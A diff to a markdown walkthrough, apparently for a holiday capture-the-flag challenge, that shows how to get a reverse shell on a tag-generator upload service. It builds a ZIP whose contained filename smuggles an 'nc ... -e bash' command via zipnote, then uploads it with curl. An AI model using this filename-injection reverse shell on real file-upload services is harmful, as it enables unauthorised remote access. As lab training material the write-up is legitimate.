@@ -45,16 +45,12 @@ GREETZ=JackFrostWasHere
 ```
 
 ## Full Interactive Remote Shell
-Create a file for executing a reverse shell named `t.jpg`:
-```
-nc <your IP address> 4444 -e /bin/bash
-```
 Create a ZIP file including an empty jpg file:
 ```
 touch joergen.jpg
 zip joergen.zip joergen.jpg
 ```
-Modify the contained filename to one with a shell command:
+Modify the contained filename to one with the shell command for the reverse shell:
 ```
 printf "@ joergen.jpg\n@=\';nc <your IP address> 4444 -e \`which bash\`;#'.jpg\n" | zipnote -w joergen.zip
 ```
@@ -69,10 +65,10 @@ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ```
 Now you have in the reverse shell listener an interactive shell as user `app`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTYwNzM0ODUxNCwtODIzMDUwODYxLDEyOT
-M3MjA0MzksMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNjE5Mjk3
-NDExLC01NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQzNSwtMz
-k4NDkxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3
-ODcsLTE0Njc2MTUyNjIsLTI0Mzk0Mjg2NiwxMzEyMDU2NDUzLD
-kyMDQ1NTg2NSwtMTYwNjA3ODA0MF19
+eyJoaXN0b3J5IjpbLTE3NjM1NDEzNTUsMTYwNzM0ODUxNCwtOD
+IzMDUwODYxLDEyOTM3MjA0MzksMTM5NTc5NDgyNCwtMTU5OTI1
+NDQxNSwtNjE5Mjk3NDExLC01NzY2MTAwNzUsMjEwNzUyOTg0Ni
+w5MjIxNDQzNSwtMzk4NDkxNDYxLDExNTE1NTY4OTYsMjM4NDYw
+MjcyLDE5MzMzNjE3ODcsLTE0Njc2MTUyNjIsLTI0Mzk0Mjg2Ni
+wxMzEyMDU2NDUzLDkyMDQ1NTg2NSwtMTYwNjA3ODA0MF19
 -->
